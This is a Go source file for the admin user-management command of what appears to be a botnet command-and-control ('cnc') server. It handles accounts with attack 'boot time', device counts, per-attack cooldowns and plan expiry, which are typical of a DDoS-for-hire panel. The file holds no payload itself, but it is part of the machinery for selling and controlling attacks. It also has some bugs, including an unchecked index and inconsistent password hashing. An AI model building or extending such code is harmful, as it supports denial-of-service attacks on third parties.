package admin

import (
	"crypto/sha256"
	"fmt"
	"server/core/master/command"
	"server/core/master/database"
	"server/core/master/encryption"
	"server/core/master/session/sessions"
	"server/core/master/utility/format"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
)

func init() {
	command.Register(&command.Command{
		Aliases:     []string{"users", "user"},
		Description: "Manages users.",
		Admin:       true,
		Executor: func(args []string, session *sessions.Session) {
			if len(args) < 1 {
				listUsers(args, session)
				return
			}
			switch args[0] {
			case "help", "?":
				session.Println("users:")
				session.Println("  " + "ban: Revokes access to the cnc")
				session.Println("  " + "edit: Modifies a user")
				session.Println("  " + "kick: Terminates a session")
				session.Println("  " + "unban: Reinstates access")
				session.Println("  " + "online: Shows all online users")
				session.Println("  " + "create: Creates a user")
				session.Println("  " + "remove: Removes a user")
				session.Println("  " + "demote: Revokes a user administrative rights")
				session.Println("  " + "promote: Grants a user administrative rights")
				break
			case "create", "add":
				createUser(args, session)
				break
			case "remove", "delete", "del":
				deleteUser(args, session)
				break
			case "promote", "admin", "admin=true", "admin=1":
				promoteUser(args, session)
				break
			case "demote", "admin=false", "standard", "admin=0":
				demoteUser(args, session)
				break
			case "ban", "revoke", "accessrevoke", "revokeaccess":
				banUser(args, session)
				break
			case "unban", "reinstate", "accessreinstate", "reinstateaccess":
				unbanUser(args, session)
				break
			case "online", "list":
				listUsers(args, session)
				break
			case "edit", "modify":
				editUser(args, session)
				break
			case "kick", "terminate":
				kickUser(args, session)
				break
			}
		},
	})
}

func kickUser(args []string, session *sessions.Session) {
	if len(args) < 2 {
		session.Println("users kick <user>")
		return
	}
	sess := sessions.Get(args[1])
	if sess != nil {
		err := sess.GetConnection().Close()
		if err != nil {
			session.Println("Failed to terminate session")
			return
		}
		session.Println("The session from " + strconv.Quote(sess.User.Name) + " has been terminated.")
		return
	}
	session.Println("Failed to terminate session")
}

func editUser(args []string, session *sessions.Session) {
	if len(args) < 2 {
		session.Println("\033[97musers edit <user> <key=value>\033[91m:")
		session.Println("  " + "\033[97mtime\033[91m: \033[97mSets the max boot time (-1 = 24h)")
		session.Println("  " + "\033[97mdevices\033[91m: \033[97mThe devices a user can have (-1 = Full)")
		session.Println("  " + "\033[97mcooldown\033[91m: \033[97mCooldown per attack (0 = None)")
		session.Println("  " + "\033[97mexpiry\033[91m: \033[97mThe expiry of the plan (-1 = Infinite)")
		session.Println("  "+"\033[97mpassword\033[91m: \033[97mChanges the password of a user", ":")
		return
	}
	args = args[1:]
	if database.DatabaseConnection.ExistsByName(args[0]) {
		user := database.DatabaseConnection.GetInfoByName(args[0])
		args = args[1:]
		if len(args) > 0 {
			for index := range args {
				flagSplit := strings.SplitN(args[index], "=", 2)
				if flagSplit[1][0] == '"' {
					flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
				}
				if len(flagSplit) != 2 {
					session.Println("Invalid key=value combination.")
					return
				}
				if flagSplit[0] == "time" {
					timed, err := strconv.Atoi(flagSplit[1])
					if err != nil {
						return
					}
					user.Time = timed
				}
				if flagSplit[0] == "cooldown" {
					timed, err := strconv.Atoi(flagSplit[1])
					if err != nil {
						return
					}
					user.Cooldown = timed
				}
				if flagSplit[0] == "devices" {
					devices, err := strconv.Atoi(flagSplit[1])
					if err != nil {
						return
					}
					user.Devices = devices
				}
				if flagSplit[0] == "password" {
					user.Password = encryption.Hash(flagSplit[1])
				}
				if flagSplit[0] == "expiry" {
					if flagSplit[1] == "-1" {
						user.Expiry = -1
					} else {
						duration, err := time.ParseDuration(flagSplit[1])
						if err != nil {
							return
						}
						user.Expiry = int(time.Now().Add(duration).Unix())
					}
				}
			}
			_, err := database.DatabaseConnection.SetUser(user)
			if err != nil {
				session.Println("Failed to save user")
				return
			}
			session.Println("The edits of user " + strconv.Quote(user.Name) + " has been saved in the database.")
		} else {
			session.Println("The user " + strconv.Quote(user.Name) + " is the same as before.")
		}
	} else {
		session.Println("User " + strconv.Quote(args[0]) + " doesn't exist.")
	}
}

func createUser(args []string, session *sessions.Session) {
	if len(args) != 7 {
		session.Println("users add <user> <password> <devices> <time> <cooldown> <expiry>")
		return
	}
	if !database.DatabaseConnection.ExistsByName(args[1]) {
		parsedDevices, err := strconv.Atoi(args[3])
		if err != nil {
			session.Println("Invalid integer.")
			return
		}
		parsedTime, err := strconv.Atoi(args[4])
		if err != nil {
			session.Println("Invalid integer.")
			return
		}
		parsedCooldown, err := strconv.Atoi(args[5])
		if err != nil {
			session.Println("Invalid integer.")
			return
		}
		if args[6] == "-1" {
			user := database.User{
				Name:     args[1],
				Password: encryption.Hash(args[2]),
				Admin:    false,
				Devices:  parsedDevices,
				Time:     parsedTime,
				Cooldown: parsedCooldown,
				Expiry:   -1,
			}
			err = database.DatabaseConnection.AddUser(user)
			if err != nil {
				session.Println("Failed to create user " + strconv.Quote(user.Name) + ".")
				return
			}
			session.Println("User " + strconv.Quote(user.Name) + " has been saved in the database.")
			return
		}
		duration, err := time.ParseDuration(args[6])
		if err != nil {
			session.Println("Invalid duration. (ex. 10H)")
			return
		}
		user := database.User{
			Name:     args[1],
			Password: fmt.Sprintf("%x", sha256.Sum256([]byte(args[2]))),
			Admin:    false,
			Devices:  parsedDevices,
			Time:     parsedTime,
			Cooldown: parsedCooldown,
			Expiry:   int(time.Now().Add(duration).Unix()),
		}
		err = database.DatabaseConnection.AddUser(user)
		if err != nil {
			session.Println("Failed to create user " + strconv.Quote(user.Name) + ".")
			return
		}
		session.Println("User " + strconv.Quote(user.Name) + " has been saved in the database.")
	} else {
		session.Println("User " + strconv.Quote(args[0]) + " already exists.")
	}
}

func deleteUser(args []string, session *sessions.Session) {
	if len(args) != 2 {
		session.Println("users remove <user>")
		return
	}
	if database.DatabaseConnection.ExistsByName(args[1]) {
		user := *database.DatabaseConnection.GetInfoByName(args[1])
		err := database.DatabaseConnection.DeleteUser(user)
		if err != nil {
			session.Println(err.Error())
			return
		}
		session.Println("The user " + strconv.Quote(user.Name) + " has been removed from the database.")
	} else {
		session.Println("User " + strconv.Quote(args[0]) + " doesn't exist.")
	}
}

func promoteUser(args []string, session *sessions.Session) {
	if len(args) != 2 {
		session.Println("users promote <user>")
		return
	}
	if database.DatabaseConnection.ExistsByName(args[1]) {
		user := database.DatabaseConnection.GetInfoByName(args[1])
		if user.Admin {
			session.Println("User can't be promoted.")
			return
		}
		user.Admin = true
		_, err := database.DatabaseConnection.SetUser(user)
		if err != nil {
			session.Println(err.Error())
			return
		}
		session.Println("Granted " + user.Name + " administrative rights.")
	} else {
		session.Println("User doesn't exist.")
	}
}

func demoteUser(args []string, session *sessions.Session) {
	if len(args) != 2 {
		session.Println("users demote <user>")
		return
	}
	if database.DatabaseConnection.ExistsByName(args[1]) {
		user := database.DatabaseConnection.GetInfoByName(args[1])
		if !user.Admin {
			session.Println("User can't be demoted.")
			return
		}
		user.Admin = false
		_, err := database.DatabaseConnection.SetUser(user)
		if err != nil {
			session.Println(err.Error())
			return
		}
		session.Println("Revoked " + user.Name + "'s administrative rights.")
	} else {
		session.Println("User doesn't exist.")
	}
}

func listUsers(args []string, session *sessions.Session) {
	table := simpletable.New()
	table.Header = &simpletable.Header{
		Cells: []*simpletable.Cell{
			{Align: simpletable.AlignCenter, Text: "Username"},
			{Align: simpletable.AlignCenter, Text: "Admin"},
			{Align: simpletable.AlignCenter, Text: "Time"},
			{Align: simpletable.AlignCenter, Text: "Devices"},
			{Align: simpletable.AlignCenter, Text: "Cooldown"},
			{Align: simpletable.AlignCenter, Text: "Client"},
			{Align: simpletable.AlignCenter, Text: "Online"},
		},
	}

	for _, sess := range sessions.Clone() {
		r := []*simpletable.Cell{
			{Text: sess.User.Name},
			{Text: format.Bool(sess.User.Admin)},
			{Text: format.Time(sess.User.Time)},
			{Text: format.Devices(sess.User.Devices)},
			{Text: format.Cooldown(sess.User.Cooldown)},
			{Text: format.ClientName(string(sess.GetConnection().ClientVersion()))},
			{Text: fmt.Sprintf("%.1f minutes", time.Since(sess.Created).Minutes())},
		}
		table.Body.Cells = append(table.Body.Cells, r)
	}

	table.Footer.Cells = []*simpletable.Cell{
		{},
		{},
		{},
		{},
		{},
		{},
		{Align: simpletable.AlignCenter, Text: "Total: " + strconv.Itoa(sessions.Count())},
	}
	table.SetStyle(simpletable.StyleCompact)
	session.Println()
	session.Println(strings.Replace(" "+table.String(), "\n", "\r\n ", -1), "\r\n")
}

func banUser(args []string, session *sessions.Session) {
	if len(args) != 2 {
		session.Println("users ban <user>")
		return
	}
	if database.DatabaseConnection.ExistsByName(args[1]) {
		user := database.DatabaseConnection.GetInfoByName(args[1])
		if user.Banned {
			session.Println("User can't be banned.")
			return
		}
		user.Banned = true
		_, err := database.DatabaseConnection.SetUser(user)
		if err != nil {
			session.Println(err.Error())
			return
		}
		session.Println("Revoked " + user.Name + "'s access to the cnc.")
	} else {
		session.Println("User doesn't exist.")
	}
}

func unbanUser(args []string, session *sessions.Session) {
	if len(args) != 2 {
		session.Println("users unban <user>")
		return
	}
	if database.DatabaseConnection.ExistsByName(args[1]) {
		user := database.DatabaseConnection.GetInfoByName(args[1])
		if !user.Banned {
			session.Println("User can't be unbanned.")
			return
		}
		user.Banned = false
		_, err := database.DatabaseConnection.SetUser(user)
		if err != nil {
			session.Println(err.Error())
			return
		}
		session.Println("Reinstated " + user.Name + "'s access to the cnc.")
	} else {
		session.Println("User doesn't exist.")
	}
}
